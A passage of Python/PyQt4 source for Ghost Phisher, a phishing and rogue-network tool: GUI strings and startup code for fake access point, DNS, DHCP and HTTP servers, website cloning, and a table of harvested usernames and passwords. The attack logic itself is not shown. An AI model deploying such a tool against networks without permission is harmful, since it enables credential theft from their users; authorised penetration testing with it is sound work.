        self.wep_radio.setText(QtGui.QApplication.translate("ghost_phisher", "WEP", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_17.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
        self.access_connection_label.setText(QtGui.QApplication.translate("ghost_phisher", "Connections:", None, QtGui.QApplication.UnicodeUTF8))
        self.access_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Start Wireless Access Point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.access_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
        self.access_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Stop Wireless Access Point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.access_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), QtGui.QApplication.translate("ghost_phisher", "Fake Access Point", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox.setTitle(QtGui.QApplication.translate("ghost_phisher", "DNS Interface Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.card_interface_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "select the network interface card you want to use", None, QtGui.QApplication.UnicodeUTF8))
        self.ip_address_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Select the IP address that you want the service to run on. (0.0.0.0 is recommended)</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.current_card_label.setText(QtGui.QApplication.translate("ghost_phisher", "Current Interface:  eth0", None, QtGui.QApplication.UnicodeUTF8))
        self.service_dns_run_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Service running on:</font>  Not Started", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_port.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>UDP DNS Port:</font> 53", None, QtGui.QApplication.UnicodeUTF8))
        self.label_5.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Protocol:</font> UDP (User Datagram Protocol)", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_2.setTitle(QtGui.QApplication.translate("ghost_phisher", "Query Responce Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.resolveall_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Resolve all queries to the following address (The currently selected IP address is recommended)", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_ip_address.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want all dns queries to resolve to", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_ip_address.setStatusTip(QtGui.QApplication.translate("ghost_phisher", "rtrtr", None, QtGui.QApplication.UnicodeUTF8))
        self.respond_domain_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Respond with Fake address only to the following website domains", None, QtGui.QApplication.UnicodeUTF8))
        self.label_6.setText(QtGui.QApplication.translate("ghost_phisher", "Address:", None, QtGui.QApplication.UnicodeUTF8))
        self.domain_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want websites added to resolve into ", None, QtGui.QApplication.UnicodeUTF8))
        self.label_7.setText(QtGui.QApplication.translate("ghost_phisher", "Website:", None, QtGui.QApplication.UnicodeUTF8))
        self.domain_label.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input a website address", None, QtGui.QApplication.UnicodeUTF8))
        self.domain_add_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">click to map websites to the corresponding faked address</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.domain_add_button.setText(QtGui.QApplication.translate("ghost_phisher", "Add", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_3.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_connection_label.setText(QtGui.QApplication.translate("ghost_phisher", "Connections:", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start DNS Server", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop DNS Server", None, QtGui.QApplication.UnicodeUTF8))
        self.dns_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.dns_tab), QtGui.QApplication.translate("ghost_phisher", "Fake DNS Server", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_4.setTitle(QtGui.QApplication.translate("ghost_phisher", "DHCP Version Information", None, QtGui.QApplication.UnicodeUTF8))
        self.label.setText(QtGui.QApplication.translate("ghost_phisher", "DHCP3 Server is installed and ready for leasing", None, QtGui.QApplication.UnicodeUTF8))
        self.label_2.setText(QtGui.QApplication.translate("ghost_phisher", "Default  Port:   67", None, QtGui.QApplication.UnicodeUTF8))
        self.label_3.setText(QtGui.QApplication.translate("ghost_phisher", "Protocol: UDP (User Datagram Protocol)", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_5.setTitle(QtGui.QApplication.translate("ghost_phisher", "DHCP Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.label_4.setText(QtGui.QApplication.translate("ghost_phisher", "Start:             ", None, QtGui.QApplication.UnicodeUTF8))
        self.start_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want leasing to start from e.g 192.168.0.1", None, QtGui.QApplication.UnicodeUTF8))
        self.label_9.setText(QtGui.QApplication.translate("ghost_phisher", "Subnet mask:  ", None, QtGui.QApplication.UnicodeUTF8))
        self.subnet_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the subnet mask 255.255.255.0", None, QtGui.QApplication.UnicodeUTF8))
        self.label_10.setText(QtGui.QApplication.translate("ghost_phisher", "Fake DNS:     ", None, QtGui.QApplication.UnicodeUTF8))
        self.fakedns_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address of the started Fake DNS Server", None, QtGui.QApplication.UnicodeUTF8))
        self.label_8.setText(QtGui.QApplication.translate("ghost_phisher", "End:        ", None, QtGui.QApplication.UnicodeUTF8))
        self.stop_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input address you want leasing to stop e.g 192.168.0.254", None, QtGui.QApplication.UnicodeUTF8))
        self.label_12.setText(QtGui.QApplication.translate("ghost_phisher", "Gateway: ", None, QtGui.QApplication.UnicodeUTF8))
        self.gateway_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the defaulf gateway address, routers address", None, QtGui.QApplication.UnicodeUTF8))
        self.label_11.setText(QtGui.QApplication.translate("ghost_phisher", "Alt DNS:  ", None, QtGui.QApplication.UnicodeUTF8))
        self.alternatedns_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input an alternate ip address", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_6.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
        self.dhcp_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.dhcp_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
        self.dhcp_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.dhcp_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), QtGui.QApplication.translate("ghost_phisher", "Fake DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_7.setTitle(QtGui.QApplication.translate("ghost_phisher", "HTTP Interface Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.http_interface_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Select an interface card", None, QtGui.QApplication.UnicodeUTF8))
        self.http_ip_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Select the IP address that you want the service to run on</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.current_card_label_2.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Current Interface:</font>  eth0", None, QtGui.QApplication.UnicodeUTF8))
        self.http_ip_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Service running on:</font>  Not Started", None, QtGui.QApplication.UnicodeUTF8))
        self.http_port_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>TCP Port:</font> 80", None, QtGui.QApplication.UnicodeUTF8))
        self.label_13.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Protocol:</font> HTTP (Hypertext Transfer Protocol)", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_8.setTitle(QtGui.QApplication.translate("ghost_phisher", "Webpage Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.emulate_website_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Clone Website:", None, QtGui.QApplication.UnicodeUTF8))
        self.emulate_website_label.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Input the web address of a website you want to clone  e.g http://www.foo-bar.com/</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.select_website_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Select Webpage:", None, QtGui.QApplication.UnicodeUTF8))
        self.website_linedit.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Input the path to a webpage you want to host   e.g /usr/local/bin/index.html</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.website_button.setText(QtGui.QApplication.translate("ghost_phisher", "Browse", None, QtGui.QApplication.UnicodeUTF8))
        self.run_webpage_port_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Run Webpage on Port :", None, QtGui.QApplication.UnicodeUTF8))
        self.use_port_http.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">input the port number of which you want the HTTP server to run on   e.g 80</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_14.setText(QtGui.QApplication.translate("ghost_phisher", "( Default HTTP Server port is 80 ) ", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_10.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
        self.http_captured_credential.setText(QtGui.QApplication.translate("ghost_phisher", "captured credentials:", None, QtGui.QApplication.UnicodeUTF8))
        self.http_captured_credential_2.setText(QtGui.QApplication.translate("ghost_phisher", "Please refer to the Harvested Credential Tab to view captured credentials", None, QtGui.QApplication.UnicodeUTF8))
        self.http_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start the HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.http_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
        self.http_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop the HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.http_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), QtGui.QApplication.translate("ghost_phisher", "Fake HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
        self.credential_table.horizontalHeaderItem(0).setText(QtGui.QApplication.translate("ghost_phisher", "Website", None, QtGui.QApplication.UnicodeUTF8))
        self.credential_table.horizontalHeaderItem(1).setText(QtGui.QApplication.translate("ghost_phisher", "Username", None, QtGui.QApplication.UnicodeUTF8))
        self.credential_table.horizontalHeaderItem(2).setText(QtGui.QApplication.translate("ghost_phisher", "Password", None, QtGui.QApplication.UnicodeUTF8))
        self.savechanges_button.setText(QtGui.QApplication.translate("ghost_phisher", "Save Changes", None, QtGui.QApplication.UnicodeUTF8))
        self.insert_button.setText(QtGui.QApplication.translate("ghost_phisher", "Insert", None, QtGui.QApplication.UnicodeUTF8))
        self.delete_button.setText(QtGui.QApplication.translate("ghost_phisher", "Delete", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), QtGui.QApplication.translate("ghost_phisher", "Harvested Credentials", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_13.setTitle(QtGui.QApplication.translate("ghost_phisher", "About Ghost Phisher", None, QtGui.QApplication.UnicodeUTF8))
        self.label_17.setText(QtGui.QApplication.translate("ghost_phisher", "Ghost Phisher is an application written in python that gives its user the power to control network", None, QtGui.QApplication.UnicodeUTF8))
        self.label_18.setText(QtGui.QApplication.translate("ghost_phisher", "services with an ultimate aim of harvesting information from a vulnerable network connection through", None, QtGui.QApplication.UnicodeUTF8))
        self.label_20.setText(QtGui.QApplication.translate("ghost_phisher", " penetrations via hosted exploit scripts ,client redirections e.t.c,the included network services", None, QtGui.QApplication.UnicodeUTF8))
        self.label_19.setText(QtGui.QApplication.translate("ghost_phisher", " could be used individually or collectively to lauch phishing attacks or run normal service queries.", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_11.setTitle(QtGui.QApplication.translate("ghost_phisher", "Disclaimer", None, QtGui.QApplication.UnicodeUTF8))
        self.label_21.setText(QtGui.QApplication.translate("ghost_phisher", "Use this program for testing your own network to see if they are vulnerable to the various ", None, QtGui.QApplication.UnicodeUTF8))
        self.label_22.setText(QtGui.QApplication.translate("ghost_phisher", " attacks that could be perpetrated with this program.  DO NOT USE IT on networks of which ", None, QtGui.QApplication.UnicodeUTF8))
        self.label_23.setText(QtGui.QApplication.translate("ghost_phisher", "you do not have permission to test.", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_12.setTitle(QtGui.QApplication.translate("ghost_phisher", "Authoring", None, QtGui.QApplication.UnicodeUTF8))
        self.label_15.setText(QtGui.QApplication.translate("ghost_phisher", "Written by:    Saviour Emmanuel Ekiko              savioboyz@rocketmail.com ", None, QtGui.QApplication.UnicodeUTF8))
        self.label_27.setText(QtGui.QApplication.translate("ghost_phisher", "Contributor:  Kashif Iftikhar                               a10n3.s7r1k3r@gmail.com", None, QtGui.QApplication.UnicodeUTF8))
        self.label_16.setText(QtGui.QApplication.translate("ghost_phisher", "Special thanks to Chris Ondrovic,Lee Baird and others for their wonderful supports through my projects", None, QtGui.QApplication.UnicodeUTF8))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), QtGui.QApplication.translate("ghost_phisher", "About", None, QtGui.QApplication.UnicodeUTF8))

class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main class for all GUI functional definitions
    ''' Main Class for GUI'''
    def __init__(self):
        QtGui.QDialog.__init__(self)

        self.setupUi(self)
        self.retranslateUi(self)
        self.dns_stop.setEnabled(False)
        self.dhcp_stop.setEnabled(False)
        self.http_stop.setEnabled(False)
        self.monitor_button.setEnabled(False)
        self.access_stop.setEnabled(False)
        self.access_start.setEnabled(False)
        self.domain_add_button.setEnabled(False)
        self.groupBox_16.setEnabled(False)

        # Thread execute Tip settings dialog after 5 seconds
        thread.start_new_thread(self.run_tips_thread,())

        # Get data from database from initialization
        global previous_database_data

        previous_database_data = self.fetch_data()

        items = str(self.fetch_data()).count('u')
        try:
            for iterate in range(0,items/3):

                self.credential_table.insertRow(iterate)

                current_credential = previous_database_data[iterate]           # Hold data like (u'www.foo-bar.com',u'username',u'password)

                website = QtGui.QTableWidgetItem()
                username = QtGui.QTableWidgetItem()
                password = QtGui.QTableWidgetItem()

                website.setText(current_credential[0])
                self.credential_table.setItem(iterate,0,website)
                username.setText(current_credential[1])
                self.credential_table.setItem(iterate,1,username)
                password.setText(current_credential[2])
                self.credential_table.setItem(iterate,2,password)

        except IndexError:
            pass

        #
        # Check if DHCP3 Server service is installed on the computer
        #
        global dhcp_installation_status
        global dhcp_server_binary
        global dhcp_config_file
        global dhcp_pid_file

        installation_status = commands.getstatusoutput('which dhcpd3')
        if installation_status[0] == 0:
            self.label.setText('<font color=green>DHCP3 Server is installed</font>')
            dhcp_installation_status = 'installed'
            dhcp_server_binary = installation_status[1]
        else:
            installation_status = commands.getstatusoutput('which dhcpd')
            if installation_status[0] == 0:
                self.label.setText('<font color=green>ISC-DHCP Server is installed</font>')
                dhcp_installation_status = 'installed'
                dhcp_server_binary = installation_status[1]
            else:
                self.label.setText('<font color=red>DHCP3 Server is not installed</font>')
                self.dhcp_status.append('<font color=green>To Install DHCP3 Server run:</font>\t<font color=red>apt-get install dhcp3-server</font>')
                dhcp_installation_status = 'not installed'
        #
        # Check if mini-httpd Server service is installed on the computer
        #
        global http_installation_status
        global ettercap_installation_status

        installalation_status = commands.getstatusoutput('which mini-httpd')
        if installation_status[0] != 0:
            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
            http_installation_status = 'not installed'
            self.http_interface_combo.setEnabled(False)
            self.http_ip_combo.setEnabled(False)
            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
            self.groupBox_8.setEnabled(False)
            self.http_start.setEnabled(False)

        self.status_textbrowser_http.append('')

        installation_status = commands.getstatusoutput('which ettercap')
        if installation_status[0] != 0:
            self.status_textbrowser_http.append('<font color=red>Packet Sniffer is not installed</font>')
            self.status_textbrowser_http.append('<font color=green>To Install Packet Sniffer run:</font>\t<font color=red>apt-get install ettercap-gtk</font>')
            ettercap_installation_status = 'not installed'
            self.http_interface_combo.setEnabled(False)
            self.http_ip_combo.setEnabled(False)
            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
            self.groupBox_8.setEnabled(False)
            self.http_start.setEnabled(False)


        installation_status_access = commands.getstatusoutput('which airbase-ng')
        if installation_status_access[0] != 0:
            self.refresh_button.setEnabled(False)
            self.access_textbrowser.append('<font color=green>Airbase-ng is not installed,to get airbase-ng run:</font>\t<font color=red>apt-get install aircrack-ng</font>')

        #
        # Read settings files and append their corresponding last settings to their input area
        #
        try:
            self.dns_ip_address.setText(read_last_settings('self.dns_ip_address'))
        except IndexError:pass                                          # If these handled exceptions get raised,it means that GUI object has not been used
        try:
            self.start_ip.setText(read_last_settings('self.start_ip'))
        except IndexError:pass
        try:
            self.subnet_ip.setText(read_last_settings('self.subnet_ip'))
        except IndexError:pass
        try:
            self.stop_ip.setText(read_last_settings('self.stop_ip'))
        except IndexError:pass
        try:
            self.fakedns_ip.setText(read_last_settings('self.fakedns_ip'))
        except IndexError:pass
        try:
            self.gateway_ip.setText(read_last_settings('self.gateway_ip'))
        except IndexError:pass
        try:
            self.alternatedns_ip.setText(read_last_settings('self.alternatedns_ip'))
        except IndexError:pass
        try:
            self.website_linedit.setText(read_last_settings('self.website_linedit'))
        except IndexError:pass
        try:
            self.ip_address_label_2.setText(read_last_settings('ip_address_label_2'))
        except IndexError:pass
        try:
            self.lineEdit_2.setText(read_last_settings('lineEdit_2'))
        except IndexError:pass
        try:
            self.access_name_edit.setText(read_last_settings('access_name_edit'))
        except IndexError:pass


        global usable_interface_cards
        global interface_cards_http
        global interface_cards

        card_list = os.listdir('/sys/class/net')                        # Directory contains list of interface cards
        terminal_output = commands.getstatusoutput('ifconfig')[1]

        for iterate in card_list:
            if iterate in terminal_output:
                if iterate != 'lo':                                     # Skip default loopback address name cause that will be manually defined
                    interface_card_list.append(iterate)

        for available_cards in interface_card_list:
            ip_output = commands.getstatusoutput('ifconfig %s | grep \'s\''%(available_cards))
            interface_list  = ip_output[1].splitlines()
            process_interface_list = interface_list[0].strip(' ')
            try:
                index_number = process_interface_list.index('Bcast:')
                ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                usable_interface_cards[available_cards] = ip_address        # Add interfaces cards and IP addresses to dictionary
            except ValueError:
                if 'Mask:' in process_interface_list:
                    index_number = process_interface_list.index('Mask:')
                    ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                    usable_interface_cards[available_cards] = ip_address

                #Else will not add card if card does not have Ip flags

        usable_interface_cards['Default Route Address'] = '0.0.0.0'                 # Add default route address to dictionary
        usable_interface_cards['Loopback Address'] = '127.0.0.1'                    # Adds the loopback address to the dictionary

        interface_cards = usable_interface_cards.keys()
        interface_cards_http = usable_interface_cards.keys()
        interface_cards.reverse()

        # Add iterface card names to the DNS interface combo and HTTP combo

        # HTTP Server runs on default route by default,"0.0.0.0" will cause problems if used on the forms action POST e.g action="http://0.0.0.0/"
        # therefore the program uses another interfaces ip address for the action posts
        interface_cards_http.remove('Default Route Address')
        interface_cards_http.reverse()

        self.card_interface_combo.addItems(interface_cards)
        self.http_interface_combo.addItems(interface_cards_http)

        interface_card_ip = []                                                      # List holding Ip addresses derived from the dictionary
        selected_interface = str(self.card_interface_combo.currentText())
        interface_card_ip.append(usable_interface_cards[selected_interface])

        self.ip_address_combo.addItems(interface_card_ip)                           #Adds the IP address of the First Card to DNS IP combo
        self.http_ip_combo.addItems(interface_card_ip)           #Adds the IP address of the First Card to HTTP IP combo


        self.current_card_label.setText("<font color=green>Current Interface:</font>  %s"%(selected_interface))


        selected_http_interface = str(self.http_interface_combo.currentText())
        if http_installation_status != 'not installed':
            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  %s"%(selected_http_interface))

        # Add channel list to fake access point combo
        channels = []
        for iterate in range(1,14):
            channels.append(str(iterate))

        self.channel_combo.addItems(channels)

        #
        # Connection to GUI object slots and Signals
        #
        self.connect(self.card_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_dns_address)
        self.connect(self.http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_http_address)
        self.connect(self.resolveall_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
        self.connect(self.respond_domain_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
        self.connect(self.dns_stop,QtCore.SIGNAL("clicked()"),self.stop_dns)
        self.connect(self.dns_start,QtCore.SIGNAL("clicked()"),self.launch_dns)
        self.connect(self.dhcp_start,QtCore.SIGNAL("clicked()"),self.launch_dhcp)
        self.connect(self.website_button,QtCore.SIGNAL("clicked()"),self.browse_webpage)
        self.connect(self.emulate_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
        self.connect(self.select_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
        self.connect(self.http_stop,QtCore.SIGNAL("clicked()"),self.stop_http)
        self.connect(self.http_start,QtCore.SIGNAL("clicked()"),self.launch_http_server)
        self.connect(self.dhcp_stop,QtCore.SIGNAL("clicked()"),self.stop_dhcp)
        self.connect(self.insert_button,QtCore.SIGNAL("clicked()"),self.insert_credential)
        self.connect(self.delete_button,QtCore.SIGNAL("clicked()"),self.delete_credential)
        self.connect(self.savechanges_button,QtCore.SIGNAL("clicked()"),self.save_changes)
        self.connect(self.start_ip,QtCore.SIGNAL("textChanged(QString)"),self.determine_subnet)
        self.connect(self.domain_add_button,QtCore.SIGNAL("clicked()"),self.ip_to_website)
        self.connect(self.refresh_button,QtCore.SIGNAL("clicked()"),self.refresh_card)
        self.connect(self.access_start,QtCore.SIGNAL("clicked()"),self.launch_Access_Point)
        self.connect(self.comboBox,QtCore.SIGNAL("currentIndexChanged(QString)"),self.card_details)
        self.connect(self.monitor_button,QtCore.SIGNAL("clicked()"),self.set_monitor)
        self.connect(self,QtCore.SIGNAL("dns started"),self.dns_started)
        self.connect(self,QtCore.SIGNAL("dns failed"),self.dns_failed)
        self.connect(self,QtCore.SIGNAL("system interrupt"),self.dns_system_interrupt)
        self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
        self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
        self.connect(self,QtCore.SIGNAL("new connection"),self.new_connection)
        self.connect(self,QtCore.SIGNAL('new credential'),self.new_credential)
        self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
        self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
        self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
        self.connect(self,QtCore.SIGNAL("access point started"),self.access_point_started)
        self.connect(self.access_stop,QtCore.SIGNAL("clicked()"),self.stop_access_point)
        self.connect(self.rouge_radio,QtCore.SIGNAL("clicked()"),self.clear_key_area)
        self.connect(self,QtCore.SIGNAL("triggered()"),QtCore.SLOT("close()"))



    #########################################################################
    #                           TIPS AND FONT SETTINGS                      #
    #########################################################################

    def keyPressEvent(self,event):
        '''Runs the font dialog window, when user
            presses F2'''
        if event.key() == QtCore.Qt.Key_F2:
            font_run = font_settings()
            font_run.exec_()



    def run_tips_thread(self):
        ''' thread component emits
            signal to evaluate execution
            of tips dialog after 2 seconds
        '''
        import time
        time.sleep(2)
        self.emit(QtCore.SIGNAL("run tips"))


    def run_tips(self):
        ''' Run tips dialog and display
            to user useful information
            on usage
        '''
        run_tips = tip_settings()
        try:
            if int(read_last_settings('tip-settings')) == 1:
                run_tips.exec_()
        except IndexError:
            run_tips.exec_()


    #########################################################################
    #               FAKE AP  DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def refresh_card(self):
        ''' functions checks for wireless
            interface cards connected
        '''
        for disable_monitor in os.listdir('/sys/class/net'):
